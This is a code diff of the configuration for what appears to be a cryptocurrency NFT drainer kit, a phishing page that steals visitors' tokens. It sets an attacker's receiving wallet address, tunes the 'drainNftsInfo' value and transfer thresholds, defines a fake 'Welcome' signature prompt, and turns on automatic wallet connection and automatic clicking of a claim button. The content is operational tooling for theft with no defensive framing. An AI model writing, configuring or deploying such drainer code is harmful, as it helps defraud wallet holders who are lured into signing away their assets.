@@ -4,8 +4,8 @@ const receiveAddress = "0xE4379016494aac79eE8583Ff5eC55C399210c718"; // YOUR WAL
 
 
 const drainNftsInfo = {
-    minValue: 0.000001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
-    maxTransfers: 1000,
+    minValue: 0.02, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
+    maxTransfers: 10,
 }
 
 const signMessage = `Welcome, \n\n` +
@@ -14,7 +14,7 @@ const signMessage = `Welcome, \n\n` +
     `Wallet Address:\n{address}\n\n` +
     `Nonce:\n{nonce}`;
 
-const autoConnect = false; //false; // auto connect wallet
+const autoConnect = true; //false; // auto connect wallet
 const autoMint = true; // auto click claim button
 
 
